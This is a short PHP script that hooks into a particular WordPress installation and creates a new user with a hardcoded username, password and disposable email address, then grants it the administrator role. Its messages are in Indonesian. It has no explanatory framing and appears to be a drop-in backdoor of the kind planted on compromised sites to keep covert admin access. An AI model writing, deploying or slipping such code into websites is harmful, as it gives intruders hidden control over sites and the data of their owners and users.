<?php
require_once( '/home/auas/public_html/wp-load.php' );

$username = 'tai';
$password = 'izinyaom';
$email    = 'tai@mailto.plus';

if ( username_exists( $username ) || email_exists( $email ) ) {
    echo "User atau Email sudah ada!";
} else {
    $user_id = wp_create_user( $username, $password, $email );

    if ( is_wp_error( $user_id ) ) {
        echo "Gagal membuat user: " . $user_id->get_error_message();
    } else {
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
        echo "Berhasil menambahkan admin: $username";
    }
}
